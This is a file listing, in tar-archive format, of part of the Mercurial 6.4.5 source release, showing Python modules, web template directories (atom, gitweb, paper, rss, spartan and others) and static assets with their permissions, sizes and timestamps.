--rw-r--r--   0 alphare   (1000) alphare   (1000)    34365 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/smartset.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    27443 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/sparse.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    23001 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/sshpeer.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    36708 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/sslutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      722 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/stack.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    12263 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/state.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     8014 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/statichttprepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    32744 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/statprof.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    25728 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/store.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    31077 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/streamclone.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9010 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/strip.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    75401 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/subrepo.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17665 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/subrepoutil.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11518 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/tagmerge.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30294 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/tags.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    15534 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templatefilters.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    30828 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templatefuncs.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    34854 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templatekw.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)    39070 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templater.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/__init__.py
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/atom/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      321 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/bookmarkentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      372 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/bookmarks.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/branchentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      367 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      282 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1350 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/changelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      484 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      265 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       86 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      563 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      306 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/tagentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      353 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/atom/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/coal/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/coal/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      549 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/coal/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       45 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/coal/map
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/gitweb/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1238 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/bookmarks.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1231 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1276 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      489 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/changelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2260 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/changeset.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1290 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2967 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/fileannotate.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2706 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/filecomparison.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2223 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/filediff.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2813 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/filerevision.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      227 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/footer.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2394 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      320 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/graphentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      527 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1181 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/help.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1645 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/helptopics.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      664 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/index.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1372 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/manifest.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)    17122 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      397 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/notfound.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1279 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/search.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1914 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/shortlog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2487 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/summary.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1208 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/gitweb/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/json/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/json/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      124 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/json/changelist.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      117 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/json/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     6809 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/json/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      864 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.bisect
--rw-r--r--   0 alphare   (1000) alphare   (1000)      854 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.changelog
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1018 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.compact
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3619 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.default
--rw-r--r--   0 alphare   (1000) alphare   (1000)      263 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.phases
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1106 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.show
--rw-r--r--   0 alphare   (1000) alphare   (1000)      972 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.status
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1624 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/map-cmdline.xml
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/monoblue/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1465 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/bookmarks.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1457 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1526 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      467 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/changelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2622 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/changeset.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2962 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/fileannotate.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3034 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/filecomparison.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2545 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/filediff.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2177 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2984 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/filerevision.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      486 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/footer.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2591 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      371 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/graphentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      495 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1406 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/help.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1951 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/helptopics.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      945 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/index.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1700 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/manifest.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)    14563 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1657 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/notfound.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1487 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/search.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2112 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/shortlog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2854 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/summary.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1430 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/monoblue/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.392352 mercurial-6.4.5/mercurial/templates/paper/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1447 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/bookmarks.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1440 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2638 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/changeset.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      341 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/diffstat.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1005 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2882 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/fileannotate.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2702 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/filecomparison.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2422 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/filediff.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     3124 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      333 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/filelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2769 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/filerevision.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       24 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/footer.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2806 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      309 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/graphentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      458 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      920 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/help.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1311 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/helptopics.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      795 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/index.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1460 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/manifest.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)    11838 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      262 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/notfound.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1721 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/search.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     2679 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/shortlog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      258 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/shortlogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1407 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/paper/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/templates/raw/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)       67 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      124 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/changeset.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       24 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       44 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/fileannotate.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       27 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/filediff.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       76 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       70 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/graphedge.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      240 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/graphnode.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       30 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/index.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      172 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/logentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)       58 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/manifest.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1183 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)       44 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/notfound.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      111 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/raw/search.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/templates/rss/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      228 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/bookmarkentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      163 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/bookmarks.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      224 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/branchentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      158 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      155 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1534 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/changelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      241 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      174 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/filelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      149 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      530 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      218 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/tagentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      153 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/rss/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/templates/spartan/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1044 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/branches.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1537 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/changelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      973 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/changelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1764 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/changeset.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      174 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/error.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1712 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/fileannotate.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1342 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/filediff.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1415 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/filelog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      877 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/filelogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1647 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/filerevision.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      162 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/footer.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1688 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/graph.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      320 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/graphentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      389 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/header.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      472 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/index.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      944 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/manifest.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     9608 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/map
--rw-r--r--   0 alphare   (1000) alphare   (1000)      262 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/notfound.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      946 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/search.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1540 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/shortlog.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)      281 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/shortlogentry.tmpl
--rw-r--r--   0 alphare   (1000) alphare   (1000)     1017 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/spartan/tags.tmpl
-drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:52.396352 mercurial-6.4.5/mercurial/templates/static/
--rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/__init__.py
--rw-r--r--   0 alphare   (1000) alphare   (1000)      603 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/background.png
--rw-r--r--   0 alphare   (1000) alphare   (1000)      273 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/coal-file.png
--rw-r--r--   0 alphare   (1000) alphare   (1000)      284 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/coal-folder.png
--rw-r--r--   0 alphare   (1000) alphare   (1000)      689 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/feed-icon-14x14.png
--rw-r--r--   0 alphare   (1000) alphare   (1000)    10887 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/followlines.js
--rw-r--r--   0 alphare   (1000) alphare   (1000)      792 2023-06-22 09:18:26.000000 mercurial-6.4.5/mercurial/templates/static/hgicon.png
